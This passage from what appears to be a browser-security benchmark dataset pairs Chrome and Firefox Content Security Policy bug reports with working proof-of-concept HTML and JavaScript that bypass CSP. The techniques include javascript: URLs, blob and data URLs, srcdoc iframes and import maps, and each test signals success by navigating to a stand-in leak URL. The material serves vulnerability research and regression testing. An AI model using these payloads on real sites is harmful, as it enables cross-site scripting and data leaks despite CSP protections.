<iframe id=\\\"iframe_href\\\" src=\\\"test_frame.html\\\"></iframe>\\n  <hr>\\n  Setting location with <code>iframe.src</code><br/>\\n  <iframe id=\\\"iframe_src\\\" src=\\\"test_frame.html\\\"></iframe>\\n  <script nonce=\\\"whitelist\\\">\\n    const iframeHref = document.querySelector(\\\"#iframe_href\\\");\\n    iframeHref.addEventListener('load', () => {\\n      iframeHref.contentWindow.location.href = \\\"javascript:'FAIL (JS URL executed)'\\\";\\n    });\\n    const iframeSrc = document.querySelector(\\\"#iframe_src\\\");\\n    iframeSrc.addEventListener('load', () => {\\n      iframeSrc.src = \\\"javascript:'FAIL (JS URL executed)'\\\";\\n    });\\n  </script>\\n</body>\\n\\nWith attachment: test_frame.html\\n<!DOCTYPE html>\\nPASS\\n\", \"TestSolution\": {\"c909865\": {\"a.test\": {\"helper2\": {\"index.js\": \"\\\"use strict\\\";\\n\\nvar iframeHref = document.querySelector(\\\"#iframe_href\\\");\\niframeHref.addEventListener(\\\"load\\\", function () {\\n  if (\\n    document\\n      .getElementById(\\\"iframe_href\\\")\\n      .contentWindow.document.body.innerHTML.indexOf(\\\"IT WORKED\\\") > -1\\n  ) {\\n    document.location.href = \\\"https://a.test/report/?leak=c909865\\\";\\n  }\\n\\n  iframeHref.contentWindow.location.href = \\\"javascript:'IT WORKED'\\\";\\n});\\n\"}, \"main\": {\"index.html\": \"<!DOCTYPE html>\\n<body>\\n    Setting location with <code>iframe.contentWindow.location.href</code><br/>\\n    <iframe id=\\\"iframe_href\\\" src=\\\"helper\\\"></iframe>\\n    <hr>\\n    Setting location with <code>iframe.src</code><br/>\\n    <iframe id=\\\"iframe_src\\\" src=\\\"helper\\\"></iframe>\\n    <script src=\\\"helper2\\\"></script>\\n</body>\", \"headers.json\": \"[{\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"default-src 'self';\\\"\\n}]\"}, \"helper\": {\"index.html\": \"PASS\"}}}}}, {\"BugReport\": \"According to the CSP Level 2 Specification \\\"If 'unsafe-inline' is not in the list\\\" ... \\\"Whenever the user agent would execute an inline script from an inline event handler, instead the user agent MUST NOT execute script, and MUST report a violation.\\\" https://www.w3.org/TR/CSP2/#allowed-script-sources however FireFox 62 and below followed the spec, but starting with FireFox 63 it ignores this restriction.\\nThe change in the code that allowed this appears to be here:\\nhttps://searchfox.org/mozilla-central/diff/5fff1762ada26b04519cf8ed24489ca1b0f73c2f/dom/security/nsCSPContext.cpp#551-566\\nGiven a CSP policy: default-src 'none';script-src 'sha256-vmevK1pwVutIOH96hxUOXymyXdR2hSlZRAu8QWiW3dw='; and the markup: <body onload=\\\"alert('attr');\\\"> the hash matches: \\\"alert('attr');\\\" it will allow execution of the script. You can see an example of this in the test page: https://www.petefreitag.com/test/csp-hash-bug.html\\nAgain, according to the CSP Level 2 spec it should only allow a valid hash or a valid nonce on \\\"a script element\\\". So, it should only allow it in the form: <script>alert('attr');</script> not in an inline event handler.\\nThe CSP Level 3 spec added a CSP source list keyword 'unsafe-hashes' which provides a way to allow execution of inline script event handlers. A bug is already filed to track implementation of unsafe-hashes: https://bugzilla.mozilla.org/show_bug.cgi?id=1343950\\nIt appears that the best way to fix this security issue would be to implement 'unsafe-hashes'. Anyone attempting to use a hash on an inline script event handler would find that it fails to execute in Chrome without adding 'unsafe-hashes', so I would not imagine any legitimate use cases would rely on the current behavior.\", \"TestSolution\": {\"f1644790\": {\"leak.test\": {\"main\": {\"index.html\": \"<body\\n  onload='document.location.href=\\\"https://a.test/report/?leak=f1644790;\\\"'\\n></body>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'none'; script-src 'sha256-1wbCYI6Vm5VFSd92LASsBaYcick8PV64bohjut2ay7s='\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3635.0 Safari/537.36\\n\\nSteps to reproduce the problem:\\n1. Go to https://shhnjk.azurewebsites.net/IKnowYouHaveNonce.html\\n2. Click go button\\n\\nWhat is the expected behavior?\\nalert(self.origin) is blocked by CSP.\\n\\nWhat went wrong?\\nhttps://crbug.com/chromium/894228 changed a way of inheriting CSP into local-schemes from parent/opener to navigation initiator. While this is good for many cases, there are corner cases that aren't covered.\\n\\nThis is because navigation initiator can be the one who haven't created local-scheme urls.\\n\\nIn above PoC, https://vuln.shhnjk.com/IHaveNonce.html creates FileSystem URL with valid nonce, but content of FileSystem URL contains attacker controlled script. When rendering FileSystem URL in iframe, attacker controlled script is blocked because navigation initiator was https://vuln.shhnjk.com/IHaveNonce.html who has CSP.\\n\\nBut when user click go, FileSystem url is navigated to data URL (data:text/html,<script>history.back()</script>) by https://shhnjk.azurewebsites.net/IKnowYouHaveNonce.html. This data URL simply loads back the previous URL. And since this data URL doesn't have CSP, when FileSystem URL is rendered for second time, it inherits CSP of data URL and bypasses previous CSP.\\n\\nThis attack might not be possible for blob URL due to it being temporary, but it should work for data URL too.\\n\\nMy opinion is to save CSP from creator/navigator of local-scheme URLs. And have that in the local-scheme URL's document, so that it doesn't rely on who navigated to local-scheme.\\n\\nThough I'm not sure how easy/difficult the patch is. And I'm not sure if this is the best option :( But I'm happy to help :)\\n\\nDid this work before? N/A\\n\\nChrome version: 73.0.3642.0  Channel: dev\\nOS Version: 10.0\\nFlash Version:\", \"TestSolution\": {\"c916326\": {\"a.test\": {\"helper2\": {\"index.js\": \"\\\"use strict\\\";\\n\\nwindow.requestFileSystem =\\n  window.requestFileSystem || window.webkitRequestFileSystem;\\nfunction onInitFs(fs) {\\n  fs.root.getFile(\\n    \\\"test.html\\\",\\n    { create: true },\\n    function (fileEntry) {\\n      fileEntry.createWriter(function (fileWriter) {\\n        var attackerControlledString =\\n          \\\"<script>document.location.href='https://a.test/report/?leak=c916326'</script>\\\";\\n        var blob = new Blob([attackerControlledString], { type: \\\"text/html\\\" });\\n        fileWriter.write(blob);\\n      }, errorHandler);\\n\\n      var url = fileEntry.toURL();\\n      document.body.appendChild(document.createElement(\\\"iframe\\\")).src = url;\\n    },\\n    errorHandler\\n  );\\n}\\n\\nfunction errorHandler(e) {\\n  console.log(e);\\n}\\n\\nwindow.requestFileSystem(window.TEMPORARY, 1024, onInitFs, errorHandler);\\n\"}, \"helper\": {\"index.html\": \"<body>\\n<script src=\\\"helper2\\\"></script>\\n</body>\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"script-src 'self'\\\"\\n    }\\n]\"}}, \"leak.test\": {\"main\": {\"index.html\": \"<iframe src=\\\"https://a.test/CSP/c916326/helper\\\"></iframe>\\n<p\\n  id=\\\"button\\\"\\n  onclick=\\\"frames[0][0].location.href='data:text/html,<script>history.back()</script>'\\\"\\n>\\n  test\\n</p>\\n<script>\\n  setTimeout(function () {\\n    document.getElementById(\\\"button\\\").click();\\n  }, 1000);\\n</script>\\n\"}}}}}, {\"BugReport\": \"A given Content-Security-Policy: sandbox ...; HTTP header directive is not correctly enforced for <embed> and <object> child frames during load, allowing to bypass the set restrictions.\\nTest case\\nparent.html:\\nContent-Security-Policy: sandbox\\n\\n<iframe src=\\\"child.html\\\"></iframe>\\n<embed src=\\\"child.html\\\"></embed>\\n<object data=\\\"child.html\\\"></object>\\nchild.html:\\n<script>prompt(document.domain)</script>\\nExpected result\\nPer the blanket sandbox directive, all three child frames should be treated as cross-origin loads and be denied script execution.\\nActual result\\nThe <embed> and <object> children are able to execute same-origin script code.\\nCSP3 spec reference:\\n6.2.2. sandbox\\nThe sandbox directive specifies an HTML sandbox policy which the user agent will apply to a resource, just as though it had been included in an iframe with a sandbox property.\\nI will follow up with additional details to the root cause.\", \"TestSolution\": {\"f1738418\": {\"leak.test\": {\"main\": {\"index.html\": \"<iframe src=\\\"helper\\\"></iframe>\\n<embed src=\\\"helper\\\"></embed>\\n<object data=\\\"helper\\\"></object>\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"sandbox\\\"\\n    }\\n]\"}, \"helper\": {\"index.html\": \"<script>\\n  document.location.href = \\\"https://a.test/report/?leak=f1738418\\\";\\n</script>\\n\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nA malicious page can abuse CSP violation reports to determine not only whether a request results in a cross-origin redirect, but also the origin of the redirection target, because the origin of the blocked resource is sent in the blocked-uri field of CSP reports and the blockedURI member of the securitypolicyviolation event.\\nThis is incorrect; the requested URL should be reported instead of the (blocked) destination URL.\\nFrom https://w3c.github.io/webappsec-csp/#create-violation-for-request :\\nNote: We use request\\u2019s url, and not its current url, as the latter might contain information about redirect targets to which the page MUST NOT be given access.\\nVERSION\\nChrome Version: 72.0.3626.109 (stable), 74.0.3709.0 (canary)\\nREPRODUCTION CASE\\nOpen the attached HTML file in Chrome.\\nThe page registers a \\\"securitypolicyviolation\\\" event listener, and loads of an attachment (from origin bugs.chromium.org via an <img>) of a (currently) non-public bug (https://crbug.com/chromium/805557 at the time of writing).\\nIf you are not logged in, a redirect to accounts.google.com occurs.\\nIf you are logged in and have access to the bug, a redirect to some long googleusercontent.com subdomain occurs.\\nIf you are logged in and have no access to the bug (e.g. log in via a Google account without security access), no redirect occurs.\\nBecause of this bug, the test page detects the redirection target via blockedURI and able to tell which of these events occurred.\\nWhat should have happened is that the blockedURI contains the originally requested URL (at bugs.chromium.org).\\nThis is what Firefox does, in compliance with the CSP spec.\\nThe kind of bug was previously reported at https://crbug.com/chromium/633306, but only partially fixed.\", \"TestSolution\": {\"c932892\": {\"leak.test\": {\"main\": {\"index.html\": \"<body>\\n  <script>\\n    var result;\\n    var done = false;\\n    document.addEventListener(\\\"securitypolicyviolation\\\", function (event) {\\n      var _URL = new URL(event.blockedURI),\\n        hostname = _URL.hostname;\\n      if (hostname === \\\"a.test\\\") {\\n        result =\\n          \\\"You are not logged in to bugs.chromium.org, found redirect to \\\" +\\n          event.blockedURI;\\n        document.location.href = \\\"https://a.test/report/?leak=c932892\\\";\\n      } else if (hostname === \\\"leak.test\\\") {\\n        result =\\n          \\\"PASS: Detected CSP violation, without information leak. The reported blockedURI is: \\\" +\\n          event.blockedURI;\\n      } else {\\n        // The test might have become invalid due to a change in how the attachments are hosted.\\n        // Or an unrelated browser extension is injecting images in the page...\\n        result =\\n          \\\"Unexpected result. Does the test case need to be updated? Found blockedURI: \\\" +\\n          event.blockedURI;\\n      }\\n      console.info(result);\\n    });\\n    window.onload = function () {\\n      img = document.createElement(\\\"img\\\");\\n      document.body.appendChild(img);\\n      img.src = \\\"https://leak.test/CSP/c932892/helper\\\";\\n    };\\n  </script>\\n</body>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"img-src https://leak.test;\\\"\\n    }\\n]\"}, \"helper\": {\"index.html\": \"Redirect\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"status\\\",\\n    \\\"value\\\": \\\"301\\\"\\n  },\\n  {\\n    \\\"key\\\": \\\"Location\\\",\\n    \\\"value\\\": \\\"https://a.test/other_path\\\"\\n  }\\n]\\n\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nImport maps allow defining import script urls without declearing nonce in script element. Landing this feature would basically allow CSP bypass on sites that uses module import.This feature is planned for Origin Trials in Chrome 74. See: https://developers.google.com/web/updates/2019/03/kv-storage\\nVERSION\\nChrome Version: 74 dev + chrome://flags/#enable-experimental-web-platform-features\\nOperating System: Windows 10\\nREPRODUCTION CASE\\nGo to https://test.shhnjk.com/imap.php\", \"TestSolution\": {\"c941340\": {\"url_queue.txt\": \"https://leak.test/CSP/c941340/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<body>\\n  <!-- XSS start -->\\n  <script type=\\\"importmap\\\">\\n    {\\n      \\\"imports\\\": {\\n        \\\"/path/to/kv-storage-polyfill.mjs\\\": [\\n          \\\"data:application/javascript,const%20storage=()=>{};storage.set=(a,b)=>{document.location='https://a.test/report/?leak=c941340'};export%20{storage};\\\"\\n        ]\\n      }\\n    }\\n  </script>\\n  <!-- XSS end -->\\n\\n  <script type=\\\"module\\\" nonce=\\\"test\\\">\\n    import { storage } from \\\"/path/to/kv-storage-polyfill.mjs\\\";\\n    storage.set(\\\"test\\\", \\\"1\\\");\\n  </script>\\n</body>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"script-src 'nonce-test'\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"similar to https://crbug.com/chromium/669086 and https://crbug.com/chromium/747847\\nbut when navigate iframe to javascript scheme , the problem comes again.\\n\\nsee poc.html\\nWith attachment: poc.html\\n<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'self';script-src 'self' 'unsafe-inline'\\\">\\n<iframe src=\\\"javascript:'<iframe src=http://www.qq.com \\\\/>'\\\"/>\\n\", \"TestSolution\": {\"c955350\": {\"url_queue.txt\": \"https://leak.test/CSP/c955350/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<iframe\\n  src=\\\"javascript:'<iframe src=https://a.test/report/?leak=c955350 \\\\/>'\\\"\\n/>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'self'; script-src 'self' 'unsafe-inline'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nWhen a page with CSP restrictions applied creates an about:blank frame (either in an iframe or within a new window), that frame inherits the same restrictions. That prevents CSP from being bypassed within the frame.\\nHowever, if a page with CSP restrictions first opens another website in a frame, then changes the location of the frame to about:blank, the frame won't have any CSP restrictions applied, even though it's now same-origin with the original page. The same thing also applies to data: URLs.\\nVERSION\\nChrome Version: Tested on 74.0.3729.108 (stable) and 76.0.3780.0 (canary)\\nOperating System: Windows 10 Pro, version 1809\\nREPRODUCTION CASE\\nThe attached files form a simple website. To begin with, download each of the files and place them in a directory.\\nIn the directory you downloaded the files to, run the following command in a terminal:\\npython3 server.py 8080\\nThis will start a simple web server that can be used to serve the files in the directory. server.py is necessary here, as it sets the following Content-Security-Policy header:\\nContent-Security-Policy: img-src none\\nThis prevents images of any source from being included.\\nIn the browser, navigate to the following location:\\nhttp://localhost:8080/index.html\\nThis page includes a single iframe, initially pointing to http://example.com/.\\nTwo seconds after the page loads, the location of the iframe is changed to about:blank. The following image element is then injected into the frame 1 second later:\\n<img src=\\\"test_image.png\\\">\\nThe image referenced here shouldn't load, given the above CSP restriction. Instead, it loads successfully and is displayed. Note that the image is in this case just a 10x10 black square.\\nIt's not possible to do this when embedding an about:blank iframe directly (i.e you have to load a different website, then change the location to about:blank). Note that the same thing also works with data: URLs.\\nCREDIT INFORMATION\\nReporter credit: David Erceg\", \"TestSolution\": {\"c957606\": {\"url_queue.txt\": \"https://a.test/CSP/c957606/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<!doctype html>\\n<html>\\n  <head>\\n    <script src=\\\"helper\\\"></script>\\n  </head>\\n  <body>\\n    <iframe src=\\\"https://leak.test\\\" id=\\\"iframe\\\"></iframe>\\n  </body>\\n</html>\", \"headers.json\": \"[{\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"img-src 'none'\\\"\\n}]\"}, \"helper\": {\"index.js\": \"\\\"use strict\\\";\\n\\nwindow.addEventListener(\\\"load\\\", function () {\\n    var iframe = document.getElementById(\\\"iframe\\\");\\n\\n    setTimeout(function () {\\n        iframe.contentWindow.location.href = \\\"about:blank\\\";\\n\\n        setTimeout(function () {\\n            var iframeDocument = iframe.contentWindow.document;\\n            var image = iframeDocument.createElement(\\\"img\\\");\\n            image.src = \\\"/report/?leak=c957606\\\";\\n            iframeDocument.body.appendChild(image);\\n        }, 1000);\\n    }, 2000);\\n});\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nWhen redirecting a same-origin download to a javascript: URL, the code that runs has user activation and bypasses CSP.\\nThis issue was found as part of https://bugs.chromium.org/p/chromium/issues/detail?id=966914.\\nVERSION\\nChrome Version: Tested on 74.0.3729.169 (stable) and 76.0.3804.1 (canary)\\nOperating System: Windows 10 Pro, version 1809\\nREPRODUCTION CASE\\nThe attached files form a simple website. To begin with, download each of the files and place them in a directory.\\nIn the directory you downloaded the files to, run the following command in a terminal:\\npython3 server.py 8080\\nThis will start a simple web server that can be used to serve the files in the directory. server.py is necessary here, as it firstly redirects requests received for download.txt:\\nif self.path == '/download.txt':\\nself.send_response(302)\\nself.send_header('Location', \\\"javascript: window.open()\\\")\\nself.end_headers()\\nThis is important in step 4 below, where a download for this file will be initiated.\\nSecondly, it sets the following Content-Security-Policy header:\\nContent-Security-Policy: script-src 'self';\\nIn the browser, navigate to the following location:\\nhttp://localhost:8080/index.html\\nThis page has a single link:\\n<a href=\\\"download.txt\\\" id=\\\"download-link\\\" download></a>\\n10 seconds after the page loads, JavaScript will click the link. When this happens, server.py will redirect the request received for download to the following javascript: URL:\\njavascript: window.open()\\nThe window.open call here should fail, given that the page has had no user interaction. Instead, it succeeds.\\nThis demonstrates two things: (1) that the script has user activation (otherwise the window.open call would fail) and (2) that CSP is bypassed (as an inline javascript: URL is executed, even though a \\\"script-src\\\" of \\\"self\\\" is used).\\nFrom debugging through the code, a same-origin download redirected to a javascript: URL is ultimately passed through the following function:\\nhttps://cs.chromium.org/chromium/src/third_party/blink/renderer/core/frame/web_local_frame_impl.cc?l=2055&rcl=fe24d6713f507dd7e4ff407a1ef769e07abef734\\nAs can be seen, this function grants user activation and sets a flag indicating CSP should be ignored. So it appears that this is the direct cause of the issue.\\nCREDIT INFORMATION\\nReporter credit: David Erceg\\nWith attachment: index.html\\n<!doctype html>\\n<html>\\n    <head>\\n        <script type=\\\"text/javascript\\\" src=\\\"main.js\\\"></script>\\n    </head>\\n    <body>\\n        <a href=\\\"download.txt\\\" id=\\\"download-link\\\" download></a>\\n    </body>\\n</html>\\n\\nWith attachment: main.js\\nwindow.addEventListener(\\\"load\\\", function onLoad(event) {\\n    setTimeout(() => {\\n        var downloadLink = document.getElementById(\\\"download-link\\\");\\n        downloadLink.click();\\n    }, 10000);\\n});\\n\\nWith attachment: server.py\\n#!/usr/bin/env python3\\nfrom http.server import HTTPServer, SimpleHTTPRequestHandler, test\\nimport sys\\n\\nclass CustomHTTPRequestHandler (SimpleHTTPRequestHandler):\\n    def do_GET(self):\\n        if self.path == '/download.txt':\\n            self.send_response(302)\\n            self.send_header('Location', \\\"javascript: window.open()\\\")\\n            self.end_headers()\\n        else:\\n            SimpleHTTPRequestHandler.do_GET(self)\\n\\n    def end_headers (self):\\n        self.send_header('Content-Security-Policy', \\\"script-src 'self';\\\")\\n        SimpleHTTPRequestHandler.end_headers(self)\\n\\nif __name__ == '__main__':\\n    test(CustomHTTPRequestHandler, HTTPServer, port=int(sys.argv[1]) if len(sys.argv) > 1 else 8000)\\n\", \"TestSolution\": {\"c967780\": {\"a.test\": {\"download\": {\"index.html\": \"\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"status\\\",\\n    \\\"value\\\": \\\"302\\\"\\n  },\\n  {\\n    \\\"key\\\": \\\"Location\\\",\\n    \\\"value\\\": \\\"javascript: window.open('https://a.test/report/?leak=c967780')\\\"\\n  },\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"script-src 'self';\\\"\\n  }\\n]\\n\"}, \"main\": {\"index.html\": \"<!doctype html>\\n<html>\\n    <head>\\n        <script type=\\\"text/javascript\\\" src=\\\"helper\\\"></script>\\n    </head>\\n    <body>\\n        <a href=\\\"download\\\" id=\\\"download-link\\\" download></a>\\n    </body>\\n</html>\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"script-src 'self';\\\"\\n    }\\n]\"}, \"helper\": {\"index.js\": \"\\\"use strict\\\";\\n\\nwindow.addEventListener(\\\"load\\\", function onLoad(event) {\\n    setTimeout(function () {\\n        var downloadLink = document.getElementById(\\\"download-link\\\");\\n        downloadLink.click();\\n    }, 1000);\\n});\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36\\n\\nSteps to reproduce the problem:\\nSame as the issue I submitted earlier:\\n\\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=671271\\n\\nI submitted this issue in 2016 , and In 62.0.3197.0, you landed the fix.\\nbut in 75.0.3770.80 this security issue can be reproduced again.\\n\\nhow to reproduce:\\n\\nEdit an html file like this\\n\\n```\\n<html>\\n<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"script-src 'unsafe-inline' 'self';img-src 'self'\\\"/>\\n<body>\\n<button onclick=\\\"breakit1()\\\">CSP TEST1</button>\\n<button onclick=\\\"breakit2()\\\">CSP TEST2</button>\\n<script>\\n    function breakit1(){\\n        open(\\\"javascript:'<img src=https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png>'\\\",\\\"_self\\\");\\n    }\\n\\n    function breakit2(){\\n\\n        location.href=\\\"javascript:'<img src=https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png>'\\\";\\n    }\\n</script>\\n\\n</body>\\n</html>\\n```\\n\\nClick the button and you will find that the image was successfully loaded.\\nContent-Security-Policy img-src directive is set to 'self'.\\n\\nWhat is the expected behavior?\\nContent security Policy block this image\\n\\nWhat went wrong?\\nremote image is loaded\\n\\nDid this work before? N/A\\n\\nChrome version: 75.0.3770.80  Channel: n/a\\nOS Version: OS X 10.14.3\\nFlash Version:\\n\\nWill the issue I submitted this time satisfy your bug bounty?\\nThe issue(671271) I submitted earlier(2016) was duplicated by 756040  which submitted later (2017),and I lose my first CVE..\", \"TestSolution\": {\"c971231\": {\"url_queue.txt\": \"http://leak.test/CSP/c971231/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<html>\\n  <body>\\n    <button id=\\\"123\\\" onclick=\\\"breakit1()\\\">CSP TEST1</button>\\n    <button id=\\\"456\\\" onclick=\\\"breakit2()\\\">CSP TEST2</button>\\n    <script>\\n      function breakit1() {\\n        open(\\n          \\\"javascript:'<img src=https://a.test/report/?leak=c971231>'\\\",\\n          \\\"_self\\\"\\n        );\\n      }\\n\\n      function breakit2() {\\n        location.href =\\n          \\\"javascript:'<img src=https://a.test/report/?leak=c971231>'\\\";\\n      }\\n      window.addEventListener(\\\"load\\\", function () {\\n        document.getElementById(\\\"123\\\").click();\\n      });\\n    </script>\\n  </body>\\n</html>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"script-src 'unsafe-inline' 'self';img-src 'self'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nWhen setting a CSP that allows blob: URIs, creating a blob: of type \\\"text/html\\\" and then navigating to that blob removes the CSP restrictions with script-src 'unsafe-inline'. That means an eval() call can been executed.Just like https://crbug.com/chromium/905301.\\nVERSION\\nChrome Version: [76.0.3809.87] + [stable]\\nOperating System: [Windows10 1903]\\nREPRODUCTION CASE\\nWhen navigating to the blob, the eval() function in the blob gets executed.\\nThis security feature is worked in Firefox/MicrosoftEdge(Dev).\\nPOC:\\n<head>  \\n    <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"script-src 'unsafe-inline' \\\">  \\n</head>  \\n  \\n<body>  \\n    <script>  \\n        let blob = new Blob([`  \\n        <script>      \\n        eval('alert(location.href)');  \\n        <\\\\/script>  \\n    `], {  \\n            type: \\\"text/html\\\"  \\n        });  \\n        let url = URL.createObjectURL(blob);  \\n        location.href = url  \\n    </script>  \\n</body>  \", \"TestSolution\": {\"c990581\": {\"url_queue.txt\": \"https://leak.test/CSP/c990581/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<body>\\n  <script>\\n    var blob = new Blob(\\n      [\\n        \\\"<script>\\\\neval('location.href = \\\\\\\"https://a.test/report/?leak=c990581\\\\\\\"');\\\\n<\\\\/script>\\\",\\n      ],\\n      {\\n        type: \\\"text/html\\\",\\n      }\\n    );\\n    var url = URL.createObjectURL(blob);\\n    location.href = url;\\n  </script>\\n</body>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"script-src 'unsafe-inline'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nWhen set the CSP as <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"script-src 'unsafe-inline'\\\"> , the eval function will also work in javascript: URL.Just like the https://crbug.com/chromium/582387.\\nVERSION\\nChrome Version: [76.0.3809.100] + [stable]\\nOperating System: [Windows10 1903]\\nREPRODUCTION CASE\\nopen the poc.html,the javascript:'<script>eval(alert(233))</script>' will be executed in Chrom.\\nFireFox/Microsoft Edge will both block the eval function.\\nChrome doesn't block the eval function.\\nThe POC.html:\\n<!DOCTYPE html>  \\n<html>  \\n<head>  \\n    <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"script-src 'unsafe-inline'\\\">  \\n</head>  \\n<body>  \\n    <script>  \\n  \\n        url1 = \\\"javascript:eval(`alert(1)`)\\\";  \\n        open(url1);  //Blocked by CSP  \\n        url2 = \\\"javascript:'<script>eval(`alert(233)`)<\\\\/script>'\\\"  \\n        open(url2);  // Not blocked by CSP.  \\n      </script>  \\n</body>  \\n</html>  \", \"TestSolution\": {\"c992698\": {\"url_queue.txt\": \"https://leak.test/CSP/c992698/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<script>\\n  //url1 = \\\"javascript:eval(`alert(1)`)\\\";\\n  //open(url1);  //Blocked by CSP\\n  url2 =\\n    \\\"javascript:'<script>eval(\\\\\\\\'document.location = \\\\\\\"https://a.test/report/?leak=c992698\\\\\\\"\\\\\\\\')<\\\\/script>'\\\";\\n  open(url2); // Not blocked by CSP.\\n</script>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"script-src 'unsafe-inline'\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nI suspect following change caused this bug.\\nhttps://chromium.googlesource.com/chromium/src.git/+/2ce31ab03b0e860eefff56647617e9851937eb12\\nBefore above change, navigation inside iframe to about:blank, data:, javascript:, and about:srcdoc would commit navigation into existing process, so those url would inherited the origin/process of navigation initiator.\\nBut after the change, if <iframe src=\\\"//evil.com\\\"> on victim.com tries to navigate to about:srcdoc, then this will inherit the origin of parent (i.e. victim.com) which is weird.\\nI was able to abuse this fact to bypass CSP. This is because CSP will try to inherit CSP from navigation initiator.\\nVERSION\\nChrome Version: 78.0.3903.0 canary\\nOperating System: Windows 10\\nREPRODUCTION CASE\\nGo to https://test.shhnjk.com/unxssable.php?xss=%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(origin);window.stop()%3C/script%3E%3Cmeta%20http-equiv=refresh%20content=%270;url=https://shhnjk.azurewebsites.net/csp_srcdoc.html%27%3E%22%3E%3C/iframe%3E\", \"TestSolution\": {\"c1001283\": {\"url_queue.txt\": \"https://leak.test/CSP/c1001283/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"helper\": {\"index.html\": \"<!DOCTYPE html>\\n<html>\\n  <head>\\n    <meta charset=\\\"utf-8\\\" />\\n    <title>You can't XSS me</title>\\n  </head>\\n  <body>\\n    <!--  XSS Start -->\\n    <iframe\\n      srcdoc=\\\"<script> location.href = 'https://a.test/report/?leak=c1001283'</script>\\\"\\n    ></iframe>\\n    <!-- XSS End -->\\n  </body>\\n</html>\\n\", \"headers.json\": \"[{\\n  \\\"key\\\": \\\"Content-Security-Policy\\\",\\n  \\\"value\\\": \\\"script-src 'none'\\\"\\n}, {\\n  \\\"key\\\": \\\"X-XSS-Protection\\\",\\n  \\\"value\\\": \\\"0\\\"\\n}]\"}}, \"leak.test\": {\"main\": {\"index.html\": \"<body>\\n  <script>\\n    if (location.ancestorOrigins.length !== 0) {\\n      location.href = \\\"about:srcdoc\\\";\\n    } else {\\n      f = document.body.appendChild(document.createElement(\\\"iframe\\\"));\\n      f.onload = () => {\\n        frames[0][0].location.href = location.href;\\n      };\\n      f.src = \\\"https://a.test/CSP/c1001283/helper\\\";\\n    }\\n  </script>\\n</body>\\n\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\n\\nhttps://crbug.com/chromium/1001283 showed how to bypass CSP on chrome 78.0.3903.0 and above.\\n\\nI tweaked it a bit to bypass CSP on every versions of Chrome (verified on M76). I guess it should be possible to reproduce it to at least M59.\\n\\nThe difference: I used history.back() instead of location.href = \\\"about:srcdoc\\\"\\n\\nREPRODUCTION CASE\\nGo to https://test.shhnjk.com/unxssable.php?xss=%20<iframe%20name=\\\"iframe_a\\\"%20srcdoc=\\\"<script>alert(origin)</script>%20<p>about-srcdoc%20iframe</p>%20<a%20href=%27https://go-back.glitch.me%27%20target=%27iframe_a%27>click%20here</a>\\\"%20</iframe>\\n\\nYou should see javascript 